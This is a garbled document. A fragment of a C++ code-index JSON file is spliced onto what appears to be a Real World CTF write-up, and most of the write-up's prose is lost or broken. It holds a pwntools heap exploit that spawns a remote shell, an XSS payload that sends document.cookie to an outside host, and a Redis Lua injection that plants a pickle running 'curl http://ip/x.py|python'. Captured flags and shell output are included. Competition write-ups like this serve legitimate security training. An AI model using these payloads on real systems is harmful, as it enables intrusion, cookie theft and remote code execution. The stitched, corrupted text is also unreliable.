         ],
         "spell":"14:8-14:13|type_co|2|514",
         "extent":"14:3-14:19|type_co|2|0",
         "type":0,
         "uses":[
         ],
         "kind":8,
         "storage":0
      },
      {
         "usr":int_oo,
         "detailed_name":"int o",
         "qual_name_offset":4,
         "short_name_offset":4,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"31:80-31:81|func_dfs|3|2",
         "extent":"31:76-31:81|func_dfs|3|0",
         "type":52,
         "uses":[
         ],
         "kind":13,
         "storage":0
      },
      {
         "usr":treenode_6,
         "detailed_name":"std::TreeNode *x",
         "qual_name_offset":15,
         "short_name_offset":15,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"29:27-29:28|func_dfs|3|514",
         "extent":"29:17-29:28|func_dfs|3|0",
         "type":type_treenode,
         "uses":[
            "30:8-30:9|func_dfs|3|12",
            "31:8-31:9|func_dfs|3|12",
            "31:20-31:21|func_dfs|3|12",
            "31:39-31:40|func_dfs|3|12",
            "32:10-32:11|func_dfs|3|12",
            "33:10-33:11|func_dfs|3|12"
         ],
         "kind":253,
         "storage":0
      },
      {
         "usr":treenode_14,
         "detailed_name":"std::TreeNode *tx",
         "qual_name_offset":15,
         "short_name_offset":15,
         "short_name_size":2,
         "hover":"std::TreeNode *tx = nullptr",
         "comments":"",
         "declarations":[
         ],
         "spell":"59:13-59:15|func_main|3|2",
         "extent":"59:3-59:25|func_main|3|0",
         "type":type_treenode,
         "uses":[
            "60:29-60:31|func_main|3|132"
         ],
         "kind":13,
         "storage":0
      },
      {
         "usr":void_func_f,
         "detailed_name":"void (*f)(std::Co *, std::TreeNode *)",
         "qual_name_offset":7,
         "short_name_offset":7,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"16:31-16:32|func_co_constructor|3|514",
         "extent":"16:24-16:51|func_co_constructor|3|0",
         "type":0,
         "uses":[
         ],
         "kind":253,
         "storage":0
      },
      {
         "usr":treenode_9,
         "detailed_name":"std::TreeNode **x",
         "qual_name_offset":16,
         "short_name_offset":16,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"49:24-49:25|func_insert|3|514",
         "extent":"49:13-49:25|func_insert|3|0",
         "type":type_treenode,
         "uses":[
            "50:11-50:12|func_insert|3|12",
            "51:5-51:6|func_insert|3|20",
            "51:19-51:20|func_insert|3|12",
            "51:32-51:33|func_insert|3|12",
            "51:46-51:47|func_insert|3|12",
            "52:4-52:5|func_insert|3|12"
         ],
         "kind":253,
         "storage":0
      },
      {
         "usr":14097758609443653436,
         "detailed_name":"int w",
         "qual_name_offset":4,
         "short_name_offset":4,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"29:80-29:81|func_dfs|3|2",
         "extent":"29:76-29:81|func_dfs|3|0",
         "type":52,
         "uses":[
         ],
         "kind":13,
         "storage":0
      },
      {
         "usr":treenode_val,
         "detailed_name":"int std::TreeNode::val",
         "qual_name_offset":4,
         "short_name_offset":19,
         "short_name_size":3,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"7:7-7:10|type_treenode|2|514",
         "extent":"7:3-7:10|type_treenode|2|0",
         "type":52,
         "uses":[
            "44:42-44:45|func_leafsimilar|3|12",
            "44:57-44:60|func_leafsimilar|3|12",
            "51:11-51:14|func_insert|3|12",
            "51:23-51:26|func_insert|3|12"
         ],
         "kind":8,
         "storage":0
      },
      {
         "usr":solution_1,
         "detailed_name":"std::Solution s",
         "qual_name_offset":0,
         "short_name_offset":0,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"63:12-63:13|func_main|3|2",
         "extent":"63:3-63:13|func_main|3|0",
         "type":class_solution,
         "uses":[
         ],
         "kind":13,
         "storage":0
      },
      {
         "usr":treenode_15,
         "detailed_name":"std::TreeNode *ty",
         "qual_name_offset":15,
         "short_name_offset":15,
         "short_name_size":2,
         "hover":"std::TreeNode *ty = nullptr",
         "comments":"",
         "declarations":[
         ],
         "spell":"59:28-59:30|func_main|3|2",
         "extent":"59:3-59:40|func_main|3|0",
         "type":type_treenode,
         "uses":[
            "61:29-61:31|func_main|3|132"
         ],
         "kind":13,
         "storage":0
      },
      {
         "usr":16409791255353764606,
         "detailed_name":"int e",
         "qual_name_offset":4,
         "short_name_offset":4,
         "short_name_size":1,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"18:80-18:81|func_co_constructor|3|2",
         "extent":"18:76-18:81|func_co_constructor|3|0",
         "type":52,
         "uses":[
         ],
         "kind":13,
         "storage":0
      },
      {
intintï¬‚ag
PWN
kid vm
guesttextguest0guestallocate0
update guesttexthostleak
         "usr":treenode_2,
         "detailed_name":"std::TreeNode *std::TreeNode::right",
         "qual_name_offset":15,
         "short_name_offset":30,
         "short_name_size":5,
         "hover":"",
         "comments":"",
         "declarations":[
         ],
         "spell":"9:13-9:18|type_treenode|2|514",
         "extent":"9:3-9:18|type_treenode|2|0",
         "type":type_treenode,
         "uses":[
            "31:23-31:28|func_dfs|3|12",
            "33:13-33:18|func_dfs|3|12",
            "51:50-51:55|func_insert|3|132"
         ],
         "kind":8,
         "storage":0
      }
   ]
}
blesswodwhoisinhk
#!/usr/bin/env python2
# coding:utf-8
from pwn import *
import os
VERBOSE = 1
DEBUG   = 1
LOCAL   = 0
target = '0e73066d87ff433989805349cfddc758'
libc   = []         # libc
break_points = []
remote_addr = '34.236.229.208'
remote_port = 9999
def hint(break_points=[]):
    if LOCAL:
        out = 'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
        for bp in break_points:
            out += " -ex 'b *{}'".format(hex(bp))
        raw_input(out+" -ex 'c'\n" if break_points else out+"\n") 
if libc:
    elf = ELF(libc[0])
    gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))
if LOCAL:
    if libc:
        for libc_ in libc:
            os.environ['LD_PRELOAD'] = os.environ['PWD'] + '/' + libc_ + ':'
    p = process('./'+target)
    if DEBUG:
        out =  'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
        for bp in break_points:
            out += " -ex 'b *{}'".format(hex(bp))
        raw_input(out+" -ex 'c'\n" if break_points else out+"\n")
else:
    p = remote(remote_addr,remote_port)
if VERBOSE: context.log_level = 'DEBUG'
def allocate_guest(size):
    p.sendafter('Your choice:','1')
    p.sendafter('Size:',str(size))
def update_guest(index, content):
    p.sendafter('Your choice:','2')
    p.sendafter('Index:',str(index))
    p.sendafter('Content:',content)
def free_guest(index):
    p.sendafter('Your choice:','3')
    p.sendafter('Index:',str(index))
def allocate_host(size):
    p.sendafter('Your choice:','4')
    p.sendafter('Size:',str(size))
def update_host(index, size, content):
    p.sendafter('Your choice:','5')
    p.sendafter('Size:',str(size))
    p.sendafter('Index:',str(index))
    p.sendafter('Content:',content)
def free_host(index):
    p.sendafter('Your choice:','6')
    p.sendafter('Index:',str(index))
def exp(cmd=None):
    allocate_host(p16(0x1000))
    allocate_host(p16(0x100))
    allocate_host(p16(0x1000))
    allocate_host(p16(0x100))
    free_host(p8(2))
    free_host(p8(0))
    allocate_host(p16(0x100))
    for i in range(0xb):
        print i
        allocate_guest(p16(0x1000))
    allocate_guest(p16(0x200))
    payload = 'A'*0x10
    with open('vm_leak','rb') as f:
        payload = f.read(0x200)
    # hint()
    update_guest(p16(0xb),payload[1::])
    update_host(p16(0),p16(0x20),"A"*0x20)
    # p.interactive()
    data = p.recvuntil("What")
    libc = u64(data[0:8]) - 3953048
    heap = u64(data[8:16]) - 4384
    print hex(libc)
    print hex(heap)
    hint()
    with open('vm_abuse_free','rb') as f:
        payload = f.read(0x200)
    update_guest(p16(0xb),payload[1::])
    allocate_host(p16(0x200)) #2
    allocate_host(p16(0x100)) #3
    # hint()
    free_host(p8(2))
    # hint()
    allocate_host(p16(0x80))
    # hint()
    magic = libc+0xf1147
    libc_addr = libc
    libc = ELF('./libc-2.23.so')
    payload = 'A'*7+p64(magic) + 'A' * (0x70)
    real_io_list=libc_addr+libc.symbols['_IO_list_all']
    real_system=libc_addr+libc.symbols['system']
    real_binsh=libc_addr+next(libc.search('/bin/sh'))
    # vtable_addr=libc_addr+0x3BE4C0
    vtable_addr=libc_addr+0x3c36e0
    fake_chunk = '\x00'*8+p64(0x61) # smallbin[4]
    fake_chunk += p64(0xddaa)+p64(real_io_list-0x10)
    fake_chunk += p64(0xffffffffffffff)+p64(0x2)+p64(0)*2+p64((real_binsh-
0x64)/2)
    fake_chunk = fake_chunk.ljust(0xa0,'\x00')
    fake_chunk += p64(real_system+0x420)
    fake_chunk = fake_chunk.ljust(0xc0,'\x00')
    fake_chunk += p64(1)
    fake_chunk += p64(0)
    fake_chunk += p64(0)
    fake_chunk += p64(heap+0x110)
    fake_chunk += p64(real_system)
    fake_chunk += p64(2)
    fake_chunk += p64(3)
    payload += fake_chunk
    update_host(p16(2),p16(len(payload)),payload)
    hint()
    allocate_host(p16(0x100))
    print hex(real_io_list)
    p.interactive()
WEB
dot free
view-sourcejs:
if __name__ == '__main__':
    exp("id")
     function lls(src) {
        var el = document.createElement('script');
        if (el) {
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        }
    };
    function lce(doc, def, parent) {
        var el = null;
        if (typeof doc.createElementNS != "undefined") el = 
doc.createElementNS("http://www.w3.org/1999/xhtml", def[0]);
        else if (typeof doc.createElement != "undefined") el = 
doc.createElement(def[0]);
        if (!el) return false;
        for (var i = 1; i
        < def.length; i++) el.setAttribute(def[i++], def[i]);
        if (parent) parent.appendChild(el);
        return el;
    };
    window.addEventListener('message', function (e) {
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && 
e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("") == 
-1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                if (e.data.iframe.type == "iframe") {
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', 
e.data.iframe.value], parent);
                } else {
                    lls(e.data.iframe.value)
                }
            }
        }
    }, false);
    window.onload = function (ev) {
JSON parsevlaueappend
jscookie document.location='http://ip/?ï¬‚ag='+document.cookie;
base64payload: http://13.57.104.34/?{"iframe":
{"value":"data:text/html;base64,ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9pcC8/ZmxhZz0nK
2RvY3VtZW50LmNvb2tpZTsKCg=="}}  ï¬‚ag
bookhub
 ip
nginxRemote Addressnginx
ip 18.213.16.123  5000 & 10010 webport
5000debugweb :
 refresh_session :
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), 
'*')
    }
Listening on [0.0.0.0] (family 0, port 80)
Connection from [13.57.104.34] port 80 [tcp/http] accepted (family 2, sport 
33466)
GET /?flag=flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    @login_required
    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
    def refresh_session():
        """
        delete all session except the logined user
        :return: json
        """
        status = 'success'
        sessionid = flask.session.sid
        prefix = app.config['SESSION_KEY_PREFIX']
        if flask.request.form.get('submit', None) == '1':
            try:
                rds.eval(rf'''
                local function has_value (tab, val)
                    for index, value in ipairs(tab) do
                        if value == val then
                            return true
                        end
                    end
 rds.eval  local inputs = {{ "{prefix}
{sessionid}" }}   sessionid lua
redis ï¬‚asksessionPickle()
lua string.char :
                    return false
                end
                local inputs = {{ "{prefix}{sessionid}" }}
                local sessions = redis.call("keys", "{prefix}*")
                for index, sid in ipairs(sessions) do
                    if not has_value(inputs, sid) then
                        redis.call("del", sid)
                    end
                end
                ''', 0)
            except redis.exceptions.ResponseError as e:
                app.logger.exception(e)
                status = 'fail'
import requests
import re
import os
import pickle
url="http://18.213.16.123:5000/login/"
url2="http://18.213.16.123:5000/admin/system/refresh_session/"
payload = 'curl http://ip/x.py|python'
class rce(object):
    def __reduce__(self):
        return (os.system,(payload,))
rcedata = pickle.dumps(rce())
for i in rcedata:
  rcedata2 = "string.char(" + ",".join(str(ord(a)) for a in rcedata) + ')'
indata='testa"} redis.call("SET", "bookhub:session:testa", '+rcedata2+')--'
print indata
cookie1={
  'bookhub-session':indata
}
cookie2={
  'bookhub-session':"testa"
}
csrftoken=requests.get(url,cookies=cookie1).text.split(' name="csrf_token" 
type="hidden" value="')[1].split('"')[0]
#print csrftoken
print requests.post(url2, cookies=cookie1, data={'submit':'1', 
'csrf_token':csrftoken}).text
ï¬‚ag
requests.get(url,cookies=cookie2)
nobody@dde6b0f908fb:/usr/src$ /readflag
/readflag
rwctf{fl45k_1s_a_MAg1cal_fr4mew0rk_t0000000000}
The 1 is djang0~
nobody@dde6b0f908fb:/usr/src$